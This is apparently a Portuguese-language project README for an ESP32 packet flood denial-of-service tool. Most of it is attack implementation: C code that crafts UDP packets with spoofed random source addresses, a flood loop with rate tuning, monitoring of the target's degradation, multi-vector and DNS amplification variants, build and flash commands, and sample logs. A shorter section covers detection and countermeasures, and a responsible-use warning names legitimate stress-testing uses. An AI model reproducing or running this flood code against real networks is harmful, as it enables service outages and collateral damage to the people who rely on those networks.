# Packet Flood Attack - Implementação Técnica

## Descrição do Ataque

O Packet Flood é um ataque de negação de serviço que visa saturar a banda passante e recursos de processamento da rede através do envio massivo de pacotes. O objetivo é consumir toda a capacidade disponível, causando degradação severa de performance ou completa indisponibilidade para tráfego legítimo.

## Funcionamento Técnico

### 1. Princípio do Ataque
```
Normal: Tráfego legítimo dentro da capacidade da rede
Ataque: Volume massivo de pacotes saturando a banda passante
Resultado: Degradação/negação de serviço para tráfego legítimo
```

### 2. Tipos de Flood Implementados
- **UDP Flood**: Pacotes UDP para portas aleatórias
- **ICMP Flood**: Ping flood com pacotes ICMP
- **TCP SYN Flood**: Requisições TCP SYN sem completar handshake
- **Broadcast Flood**: Pacotes broadcast saturando a rede local
- **Fragmented Packet Flood**: Pacotes fragmentados sobrecarregando reassembly

### 3. Implementação no ESP32

#### 3.1 Estrutura de Controle do Flood
```c
typedef struct {
    uint32_t packets_sent;
    uint32_t bytes_sent;
    uint32_t target_rate_pps;  // Packets per second
    uint32_t actual_rate_pps;
    flood_type_t type;
    bool is_active;
    uint32_t start_time;
} packet_flood_stats_t;

typedef enum {
    FLOOD_TYPE_UDP,
    FLOOD_TYPE_ICMP,
    FLOOD_TYPE_TCP_SYN,
    FLOOD_TYPE_BROADCAST,
    FLOOD_TYPE_FRAGMENTED,
    FLOOD_TYPE_MIXED
} flood_type_t;
```

#### 3.2 Geração de Pacotes UDP
```c
void create_udp_flood_packet(uint8_t *buffer, size_t *packet_size) {
    ip_header_t *ip_hdr = (ip_header_t*)buffer;
    udp_header_t *udp_hdr = (udp_header_t*)(buffer + sizeof(ip_header_t));
    
    // Cabeçalho IP
    ip_hdr->version_ihl = 0x45;
    ip_hdr->tos = 0;
    ip_hdr->total_length = htons(sizeof(ip_header_t) + sizeof(udp_header_t) + PAYLOAD_SIZE);
    ip_hdr->id = htons(esp_random() & 0xFFFF);
    ip_hdr->flags_fragment = 0;
    ip_hdr->ttl = 64;
    ip_hdr->protocol = 17;  // UDP
    ip_hdr->src_ip = get_random_source_ip();
    ip_hdr->dst_ip = inet_addr(TARGET_IP);
    ip_hdr->checksum = 0;
    ip_hdr->checksum = calculate_ip_checksum(ip_hdr);
    
    // Cabeçalho UDP
    udp_hdr->src_port = htons(esp_random() % 65535);
    udp_hdr->dst_port = htons(esp_random() % 65535);
    udp_hdr->length = htons(sizeof(udp_header_t) + PAYLOAD_SIZE);
    udp_hdr->checksum = 0;
    
    // Payload aleatório
    uint8_t *payload = buffer + sizeof(ip_header_t) + sizeof(udp_header_t);
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        payload[i] = esp_random() & 0xFF;
    }
    
    *packet_size = sizeof(ip_header_t) + sizeof(udp_header_t) + PAYLOAD_SIZE;
}
```

#### 3.3 Engine de Flood Principal
```c
static void packet_flood_task(void *pvParameters) {
    uint8_t packet_buffer[MAX_PACKET_SIZE];
    size_t packet_size;
    uint32_t last_stats_time = 0;
    uint32_t packets_this_second = 0;
    
    ESP_LOGI(TAG, " INICIANDO PACKET FLOOD!");
    ESP_LOGI(TAG, " Alvo: %s", TARGET_IP);
    ESP_LOGI(TAG, " Tipo: %s", get_flood_type_name(FLOOD_TYPE));
    ESP_LOGI(TAG, " Taxa alvo: %d pacotes/segundo", TARGET_PACKET_RATE);
    
    while (packets_sent < MAX_PACKETS && keep_flooding) {
        uint32_t current_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
        
        // Gerar pacote baseado no tipo de flood
        switch (FLOOD_TYPE) {
            case FLOOD_TYPE_UDP:
                create_udp_flood_packet(packet_buffer, &packet_size);
                break;
            case FLOOD_TYPE_ICMP:
                create_icmp_flood_packet(packet_buffer, &packet_size);
                break;
            case FLOOD_TYPE_TCP_SYN:
                create_tcp_syn_packet(packet_buffer, &packet_size);
                break;
            case FLOOD_TYPE_BROADCAST:
                create_broadcast_packet(packet_buffer, &packet_size);
                break;
            default:
                create_udp_flood_packet(packet_buffer, &packet_size);
        }
        
        // Enviar pacote
        esp_err_t result = send_raw_packet(packet_buffer, packet_size);
        
        if (result == ESP_OK) {
            packets_sent++;
            bytes_sent += packet_size;
            packets_this_second++;
            
            if (packets_sent % 100 == 0) {
                ESP_LOGD(TAG, " Pacote #%d enviado (%d bytes)", 
                         packets_sent, packet_size);
            }
        }
        
        // Controle de rate
        uint32_t elapsed_ms = current_time - last_stats_time;
        if (elapsed_ms >= 1000) {  // 1 segundo
            update_flood_stats(packets_this_second, elapsed_ms);
            packets_this_second = 0;
            last_stats_time = current_time;
        }
        
        // Delay para controlar taxa
        uint32_t target_interval = 1000 / TARGET_PACKET_RATE;  // ms
        vTaskDelay(pdMS_TO_TICKS(target_interval));
    }
    
    show_final_flood_stats();
}
```

#### 3.4 Controle de Taxa Dinâmico
```c
void adjust_flood_rate(void) {
    static uint32_t last_adjustment = 0;
    uint32_t current_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
    
    if (current_time - last_adjustment > RATE_ADJUSTMENT_INTERVAL) {
        if (actual_rate_pps < target_rate_pps * 0.9) {
            // Taxa muito baixa, reduzir delay
            current_delay_ms = (current_delay_ms * 9) / 10;
            ESP_LOGD(TAG, "umentando taxa: delay = %dms", current_delay_ms);
        } else if (actual_rate_pps > target_rate_pps * 1.1) {
            // Taxa muito alta, aumentar delay
            current_delay_ms = (current_delay_ms * 11) / 10;
            ESP_LOGD(TAG, " Reduzindo taxa: delay = %dms", current_delay_ms);
        }
        
        last_adjustment = current_time;
    }
}
```

#### 3.5 Monitoramento de Impacto
```c
typedef struct {
    uint32_t baseline_ping_ms;
    uint32_t current_ping_ms;
    float throughput_degradation_percent;
    bool target_unreachable;
    uint32_t packet_loss_percent;
} impact_assessment_t;

void monitor_network_impact(void) {
    static uint32_t last_ping_test = 0;
    uint32_t current_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
    
    if (current_time - last_ping_test > PING_TEST_INTERVAL) {
        // Testar conectividade com alvo
        uint32_t ping_time = test_ping_latency(TARGET_IP);
        
        if (ping_time == 0) {
            ESP_LOGI(TAG, " ALVO INACESSÍVEL - Flood eficaz!");
            target_unreachable = true;
        } else {
            float degradation = ((float)ping_time / baseline_ping_ms - 1.0) * 100;
            ESP_LOGI(TAG, " Latência: %dms (degradação: %.1f%%)", 
                     ping_time, degradation);
        }
        
        last_ping_test = current_time;
    }
}
```

## Configurações de Ataque

### 1. Parâmetros de Flood
```c
#define TARGET_IP "192.168.4.1"          // IP do alvo (AP/Gateway)
#define TARGET_PACKET_RATE 1000          // Pacotes por segundo
#define MAX_PACKETS 100000               // Máximo de pacotes
#define PAYLOAD_SIZE 1024                // Tamanho do payload
#define FLOOD_DURATION_SEC 60            // Duração em segundos
#define PACKET_SIZE_MIN 64               // Tamanho mínimo
#define PACKET_SIZE_MAX 1500             // Tamanho máximo (MTU)
```

### 2. Tipos de Payload
```c
typedef enum {
    PAYLOAD_RANDOM,      // Dados aleatórios
    PAYLOAD_ZEROS,       // Zeros (otimizado para taxa)
    PAYLOAD_PATTERN,     // Padrão específico
    PAYLOAD_AMPLIFIED    // Dados que causam amplificação
} payload_type_t;
```

### 3. Configurações de Rede
```c
typedef struct {
    char source_ip_range[32];     // Range de IPs origem
    uint16_t source_port_min;     // Porta origem mínima
    uint16_t source_port_max;     // Porta origem máxima
    uint16_t dest_port_min;       // Porta destino mínima
    uint16_t dest_port_max;       // Porta destino máxima
    bool randomize_headers;       // Randomizar cabeçalhos
} flood_network_config_t;
```

## Como Executar

### 1. Pré-requisitos
```bash
# ESP-IDF configurado
. $HOME/esp/esp-idf/export.sh

# Rede alvo ativa e acessível
# Permissões para envio de pacotes raw
```

### 2. Configuração e Execução
```bash
cd PacketFlood/

# Configurar parâmetros de flood
idf.py menuconfig
# → Component config → LWIP → RAW socket support

# Compilar com otimizações
idf.py build

# Flash e executar
idf.py -p /dev/ttyUSB0 flash
idf.py -p /dev/ttyUSB0 monitor
```

### 3. Sequência de Operação
```
1. ESP32 conecta à rede alvo
2. Estabelece baseline de performance
3. Inicia geração massiva de pacotes
4. Monitora impacto na rede
5. Ajusta taxa dinamicamente
6. Relatório final de eficácia
```

## Análise de Logs

### 1. Inicialização do Flood
```
I (2000) PACKET_FLOOD:  INICIANDO PACKET FLOOD ATTACK! 
I (2010) PACKET_FLOOD:  Alvo: 192.168.4.1
I (2020) PACKET_FLOOD:  Tipo: UDP_FLOOD
I (2030) PACKET_FLOOD:  Taxa alvo: 1000 pacotes/segundo
I (2040) PACKET_FLOOD:  Tamanho do pacote: 1024 bytes
I (2050) PACKET_FLOOD:  Duração máxima: 60 segundos
```

### 2. Baseline de Rede
```
I (3000) PACKET_FLOOD:  Estabelecendo baseline de rede...
I (3010) PACKET_FLOOD:  Ping baseline: 15ms
I (3020) PACKET_FLOOD: hroughput baseline: 50 Mbps
I (3030) PACKET_FLOOD:  Baseline estabelecida, iniciando flood...
```

### 3. Execução do Ataque
```
W (5000) PACKET_FLOOD:  Flood iniciado!
I (6000) PACKET_FLOOD:  Taxa atual: 987 pps (target: 1000 pps)
I (7000) PACKET_FLOOD:  Pacotes enviados: 1987, Bytes: 2.0 MB
W (8000) PACKET_FLOOD:  Latência aumentou para 156ms (+940%)
```

### 4. Monitoramento de Impacto
```
W (15000) PACKET_FLOOD:  IMPACTO NA REDE:
W (15010) PACKET_FLOOD:  Latência: 234ms (baseline: 15ms)
W (15020) PACKET_FLOOD:  Degradação: 1460%
W (15030) PACKET_FLOOD:  Perda de pacotes: 12%
W (15040) PACKET_FLOOD:  Throughput restante: ~5 Mbps
```

### 5. Estatísticas Finais
```
W (60000) PACKET_FLOOD:  PACKET FLOOD CONCLUÍDO!
W (60010) PACKET_FLOOD:  Total de pacotes: 58,945
W (60020) PACKET_FLOOD:  Total de bytes: 60.3 MB
W (60030) PACKET_FLOOD:  Taxa média: 982 pps
W (60040) PACKET_FLOOD:  Eficácia do ataque: 95%
W (60050) PACKET_FLOOD:  Impacto máximo: SEVERO
```

## Detecção e Contramedidas

### 1. Sinais de Packet Flood
- **Volume anômalo** de tráfego de entrada
- **Padrões repetitivos** nos cabeçalhos de pacotes
- **Degradação súbita** de performance
- **Aumento dramático** na utilização de banda
- **Timeouts** em serviços normais

### 2. Métricas de Detecção
```c
typedef struct {
    uint32_t packets_per_second;
    uint32_t bytes_per_second;
    float cpu_utilization_percent;
    uint32_t memory_usage_mb;
    uint32_t connection_timeouts;
    bool flood_detected;
} flood_detection_metrics_t;

// Thresholds típicos
#define NORMAL_PPS_THRESHOLD 100
#define SUSPICIOUS_PPS_THRESHOLD 1000
#define FLOOD_PPS_THRESHOLD 5000
#define NORMAL_BPS_THRESHOLD (1024 * 1024)      // 1 MB/s
#define FLOOD_BPS_THRESHOLD (50 * 1024 * 1024)  // 50 MB/s
```

### 3. Contramedidas Implementáveis

#### 3.3.1 Rate Limiting Baseado em IP
```c
typedef struct {
    uint32_t ip_addr;
    uint32_t packet_count;
    uint32_t byte_count;
    uint32_t window_start;
    bool rate_limited;
} ip_rate_limit_t;

bool should_drop_packet(uint32_t src_ip) {
    ip_rate_limit_t *entry = find_or_create_entry(src_ip);
    
    if (entry->packet_count > MAX_PPS_PER_IP) {
        entry->rate_limited = true;
        return true;  // Drop packet
    }
    
    return false;
}
```

#### 3.3.2 Traffic Shaping
```c
typedef struct {
    uint32_t max_rate_bps;
    uint32_t burst_size;
    uint32_t current_tokens;
    uint32_t last_refill;
} token_bucket_t;

bool token_bucket_allow(token_bucket_t *bucket, uint32_t packet_size) {
    refill_tokens(bucket);
    
    if (bucket->current_tokens >= packet_size) {
        bucket->current_tokens -= packet_size;
        return true;  // Allow packet
    }
    
    return false;  // Drop packet
}
```

#### 3.3.3 Anomaly Detection
```c
typedef struct {
    uint32_t baseline_pps;
    uint32_t baseline_bps;
    float deviation_threshold;
    uint32_t detection_window_sec;
} anomaly_detector_t;

bool detect_flood_anomaly(uint32_t current_pps, uint32_t current_bps) {
    float pps_ratio = (float)current_pps / baseline_pps;
    float bps_ratio = (float)current_bps / baseline_bps;
    
    return (pps_ratio > ANOMALY_THRESHOLD || bps_ratio > ANOMALY_THRESHOLD);
}
```

## Variações do Ataque

### 1. Adaptive Rate Flood
```c
void adaptive_rate_flood(void) {
    uint32_t current_rate = INITIAL_RATE;
    uint32_t max_effective_rate = 0;
    
    while (current_rate <= MAX_RATE) {
        test_flood_rate(current_rate);
        
        if (is_target_responsive()) {
            max_effective_rate = current_rate;
            current_rate *= 1.5;  // Aumentar 50%
        } else {
            // Encontrou limite, usar taxa eficaz máxima
            use_optimal_rate(max_effective_rate);
            break;
        }
    }
}
```

### 2. Multi-Vector Flood
```c
void multi_vector_flood(void) {
    // Combinar múltiplos tipos de flood
    create_task(udp_flood_task, "udp_flood", 4096, NULL, 5, NULL);
    create_task(icmp_flood_task, "icmp_flood", 4096, NULL, 5, NULL);
    create_task(tcp_syn_flood_task, "tcp_syn_flood", 4096, NULL, 5, NULL);
    
    // Coordenar ataques para máximo impacto
    coordinate_multi_vector_timing();
}
```

### 3. Amplification Flood
```c
// Usar protocolos que causam amplificação
void dns_amplification_flood(void) {
    // Criar query DNS que gera resposta grande
    create_dns_query_for_amplification();
    
    // Usar IP spoofing apontando para a vítima
    spoof_source_ip_to_victim();
    
    // Enviar para servidores DNS públicos
    send_to_open_dns_resolvers();
}
```

## Análise de Impacto

### 1. Impacto na Infraestrutura
```c
typedef struct {
    float bandwidth_utilization_percent;
    float cpu_usage_percent;
    float memory_usage_percent;
    uint32_t dropped_packets;
    uint32_t failed_connections;
    bool service_unavailable;
} infrastructure_impact_t;
```

### 2. Métricas de QoS
- **Latência**: Aumento de 200-2000% durante flood
- **Throughput**: Redução de 50-95% para tráfego legítimo
- **Packet Loss**: 5-80% dependendo da intensidade
- **Jitter**: Aumento significativo na variação de latência

### 3. Eficácia por Tipo de Flood
```c
typedef struct {
    flood_type_t type;
    float effectiveness_score;
    uint32_t detection_time_sec;
    uint32_t mitigation_difficulty;
} flood_effectiveness_t;

flood_effectiveness_t effectiveness_table[] = {
    {FLOOD_TYPE_UDP, 8.5, 5, 6},        // Alta eficácia, fácil detecção
    {FLOOD_TYPE_TCP_SYN, 9.0, 3, 8},    // Muito eficaz, difícil mitigação
    {FLOOD_TYPE_ICMP, 7.0, 2, 4},       // Moderada, fácil bloqueio
    {FLOOD_TYPE_FRAGMENTED, 8.8, 8, 9}  // Muito eficaz, muito difícil
};
```

## Limitações e Considerações

### 1. Limitações do ESP32
- **Single Core**: Processamento limitado para alta taxa
- **Memory**: Buffer limitado para packets em queue
- **Network Stack**: LWIP pode ser gargalo
- **Power**: Consumo alto durante flood intensivo

### 2. Limitações de Rede
- **MTU**: Limitação no tamanho máximo de pacotes
- **Switch Capacity**: Switches podem implementar flood protection
- **ISP Filtering**: Provedores podem filtrar tráfego anômalo
- **Legal**: Muitas jurisdições consideram flood como crime

### 3. Detectabilidade
- **Pattern Recognition**: Fácil de detectar por padrões
- **Volume Analysis**: Volume anômalo é óbvio
- **Source Tracing**: IP do atacante é facilmente identificado
- **Forensics**: Logs extensivos permitem investigação

## Uso Responsável

 **AVISO CRÍTICO**:
- **Autorização Obrigatória**: Nunca execute contra redes não autorizadas
- **Impacto Real**: Pode causar danos significativos à infraestrutura
- **Responsabilidade Legal**: Violação pode resultar em processos criminais
- **Danos Colaterais**: Pode afetar serviços críticos inesperadamente

### Cenários Legítimos:
1. **Stress Testing**: Teste de capacidade de infraestrutura própria
2. **DDoS Simulation**: Simulação para teste de contramedidas
3. **Research**: Desenvolvimento de técnicas de detecção
4. **Training**: Demonstração educacional controlada

## Troubleshooting

### Problemas Comuns
1. **Low Packet Rate**: Verificar configurações de LWIP
2. **Memory Exhaustion**: Reduzir buffer sizes ou rate
3. **Network Unreachable**: Verificar conectividade básica
4. **Ineffective Attack**: Alvo pode ter proteções ativas

### Otimização de Performance
```bash
# Configurações de LWIP para alta performance
CONFIG_LWIP_TCP_SND_BUF_DEFAULT=65535
CONFIG_LWIP_TCP_WND_DEFAULT=65535
CONFIG_LWIP_UDP_RECVMBOX_SIZE=32
CONFIG_LWIP_TCPIP_RECVMBOX_SIZE=64

# Monitor de performance
idf.py monitor --print_filter "*:I" | grep -E "(packet|flood|rate)"

# Análise de memória
idf.py monitor | grep heap
```
